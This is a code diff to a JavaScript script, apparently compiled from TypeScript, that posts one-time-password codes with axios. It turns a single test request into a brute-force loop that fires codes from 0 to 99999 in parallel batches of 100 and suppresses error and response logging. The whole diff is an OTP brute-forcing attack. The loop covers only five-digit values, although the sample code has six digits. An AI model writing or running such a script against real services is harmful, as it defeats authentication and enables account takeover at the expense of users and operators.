@@ -30,12 +30,26 @@ function sendRequest(otp) {
             data: data
         };
         try {
-            const response = yield axios_1.default.request(config);
-            console.log(JSON.stringify(response.data));
+            yield axios_1.default.request(config);
+            // console.log(JSON.stringify(response.data));
         }
         catch (error) {
-            console.log(error);
+            // console.log(error);
         }
     });
 }
-sendRequest("264291");
+// sendRequest("264291");
+function main() {
+    return __awaiter(this, void 0, void 0, function* () {
+        for (let i = 0; i <= 99999; i += 100) {
+            const p = [];
+            console.log(i);
+            // promise
+            for (let j = 0; j < 100; j++) {
+                p.push(sendRequest((i + j).toString()));
+            }
+            yield Promise.all(p);
+        }
+    });
+}
+main();
